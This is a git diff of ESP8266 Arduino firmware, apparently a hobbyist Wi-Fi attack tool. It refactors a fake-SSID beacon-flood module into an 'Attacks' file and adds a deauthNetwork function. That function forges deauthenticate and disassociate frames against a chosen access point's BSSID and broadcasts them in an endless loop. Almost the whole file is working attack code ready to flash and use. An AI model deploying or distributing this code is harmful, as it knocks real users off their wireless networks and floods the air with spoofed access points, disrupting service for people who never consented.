@@ -1,10 +1,11 @@
 
-#include "BeaconSpam.h"
+#include "Attacks.h"
 
+#define NUM_CHANNELS 3
 const uint8_t channels[] = {1, 6, 11}; // commonly used wifi channels on 2.4ghz
 
 #define DEFAULT_NUM_SSIDS 8
-char* spam_SSIDS[] = {
+char* default_Spam_SSIDs[] = {
   "1) Never gonna give you Up", 
   "2) Never gonna let you Down", 
   "3) Never gonna run around",
@@ -29,25 +30,39 @@ uint8_t beaconPacket[128] = {
 /*34*/  0x21, 0x04, //Capability info
 /* SSID */
 /*36*/  0x00
-};                       
+};                    
 
 uint8_t postSSID[13] = {
         0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
         0x03, 0x01, 0x04
 };
 
+uint8_t deauthPacket[DEAUTH_PACKET_SIZE] = {
+    /*0 - 1*/  0x00, 0x00, // Frame Control -> Packet type
+    /*2 - 3*/  0x00, 0x00, // Duration
+    /*4 - 9*/  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast) (all 0xff means to everyone instead of a specific device)
+    /*10 - 15*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
+    /*16 - 21*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
+    /*22 - 23*/  0x00, 0x00, // Fragment & Sequence number
+    /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
+};
 
-bool beaconSpamSetup() {
-    wifi_promiscuous_enable(1);
-    return true;
+// generic function to handle packet sending
+bool sendPacket(uint8_t* packet, uint8_t pktSize){
+    int result = wifi_send_pkt_freedom(packet, pktSize, 0);
+    return result == 0;
 }
 
 void sendBeacon(char* ssids[], uint8_t numSSIDS){
-
+    
     //randomize the source MAC address
-    for(int k=0; k< 6; k++){
-        beaconPacket[10 + k] = beaconPacket[16 + k] = random(256);
+    uint8_t randomMac[MAC_ADDR_LEN];
+    for(int k=0; k< MAC_ADDR_LEN; k++){
+        randomMac[k] = random(256);
     }
+    memcpy(&beaconPacket[10], randomMac, MAC_ADDR_LEN);
+    memcpy(&beaconPacket[16], randomMac, MAC_ADDR_LEN);
+
     int ssidSize;
     int packetSize;
     uint32_t packetCount = 0;
@@ -72,13 +87,13 @@ void sendBeacon(char* ssids[], uint8_t numSSIDS){
             wifi_set_channel(channels[i]);
             beaconPacket[50 + ssidSize] = channels[i];
 
-            packetCount += wifi_send_pkt_freedom(beaconPacket, packetSize, 0) == 0;  
+            packetCount += sendPacket(beaconPacket, packetSize);  
             delay(5);
             
         }
 
         time = millis();
-        if(time - lastTime > 50000){
+        if(time - lastTime > 5000){
             Serial.printf("Sent %d packets\n", packetCount);
             lastTime = time;
         }
@@ -87,11 +102,11 @@ void sendBeacon(char* ssids[], uint8_t numSSIDS){
     }
 }
 
-void defaultAttack(){
-    sendBeacon(spam_SSIDS, DEFAULT_NUM_SSIDS);
+void defaultSSIDSpam(){
+    sendBeacon(default_Spam_SSIDs, DEFAULT_NUM_SSIDS);
 }
 
-void customAttack(){
+void customSSIDSpam(){
     String customSSID;
     uint8_t numSSIDLimit;
 
@@ -123,11 +138,48 @@ void beaconSpam() {
     
     switch(menuChoice){
         case 1:
-            defaultAttack(); break;
+            defaultSSIDSpam(); break;
         case 2:
-            customAttack(); break;
+            customSSIDSpam(); break;
         default:
             Serial.println("Invalid Input");
             break;
+    }
+}
+
+// void deauthAttack() {
+void deauthNetwork(uint8_t targetChannel, uint8_t* targetBSSID){
+    Serial.println("Deauthing...");
+    wifi_set_channel(targetChannel);
+
+    // initialize deauth packet with target's BSSID
+    uint8_t deauthPkt[DEAUTH_PACKET_SIZE];
+    memcpy(deauthPkt, deauthPacket, DEAUTH_PACKET_SIZE);
+    memcpy(&deauthPkt[10], targetBSSID, MAC_ADDR_LEN);
+    memcpy(&deauthPkt[16], targetBSSID, MAC_ADDR_LEN);
+    deauthPkt[0] = 0xc0; // change packet type to Deauthenticate
+
+    // initialize disassociate packet from deauth packet
+    uint8_t disassociatePkt[DEAUTH_PACKET_SIZE];
+    memcpy(disassociatePkt, deauthPkt, DEAUTH_PACKET_SIZE);
+    disassociatePkt[0] = 0xa0; // change packet type to Disassociate
+
+    uint32_t packetCount = 0;
+    uint32_t time = millis();
+    uint32_t lastTime = time;
+
+    //send both packets
+    while (true){
+        packetCount += sendPacket(deauthPkt, DEAUTH_PACKET_SIZE);
+        delay(5);
+
+        packetCount += sendPacket(disassociatePkt, DEAUTH_PACKET_SIZE);
+        delay(5);
+
+        time = millis();
+        if(time - lastTime > 5000){
+            Serial.printf("Sent %d packets\n", packetCount);
+            lastTime = time;
+        }
     }
 }
